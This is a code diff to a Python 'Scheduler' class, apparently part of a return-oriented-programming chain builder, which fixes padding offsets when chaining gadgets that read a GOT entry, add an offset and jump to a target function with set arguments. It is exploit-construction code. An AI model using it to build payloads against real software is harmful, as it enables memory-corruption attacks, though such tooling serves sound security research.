@@ -252,20 +252,22 @@ class Scheduler(object):
       start_of_function_address = arg_gadgets[0].address
 
     # set the read address
-    chain = self.create_set_reg_chain(set_read_addr_gadget, address, read_gadget.address)
+    chain = self.create_set_reg_chain(set_read_addr_gadget, address - read_gadget.params[0], read_gadget.address)
 
     # read the address in the GOT
-    chain += (read_gadget.rip_in_stack_offset - len(chain)) * "B"
-    chain += self.ap(set_add_reg_gadget.address)
-    chain += (set_add_reg_gadget.stack_offset - len(chain)) * "C"
+    read_gadget_chain = read_gadget.rip_in_stack_offset * "B"
+    read_gadget_chain += self.ap(set_add_reg_gadget.address)
+    read_gadget_chain += (set_add_reg_gadget.stack_offset - len(read_gadget_chain)) * "C"
+    chain += read_gadget_chain
 
     # set the offset from the base to the target
     chain += self.create_set_reg_chain(set_add_reg_gadget, offset, add_jump_reg_gadget.address)
 
     # add the offset
-    chain += (add_jump_reg_gadget.rip_in_stack_offset - len(chain)) * "B"
-    chain += self.ap(start_of_function_address)
-    chain += (add_jump_reg_gadget.stack_offset - len(chain)) * "C"
+    add_jump_reg_gadget_chain = add_jump_reg_gadget.rip_in_stack_offset * "B"
+    add_jump_reg_gadget_chain += self.ap(start_of_function_address)
+    add_jump_reg_gadget_chain += (add_jump_reg_gadget.stack_offset - len(add_jump_reg_gadget_chain)) * "C"
+    chain += add_jump_reg_gadget_chain
 
     # Set the arguments for the function
     for i in range(len(arg_gadgets)):
@@ -275,7 +277,7 @@ class Scheduler(object):
       chain += self.create_set_reg_chain(arg_gadgets[i], arguments[i], next_address)
 
     # Finally, jump to the function
-    chain += (jump_gadget.stack_offset - len(chain)) * "C"
+    chain += jump_gadget.stack_offset * "C"
     chain += self.ap(end_address)
 
     return (chain, set_read_addr_gadget.address)
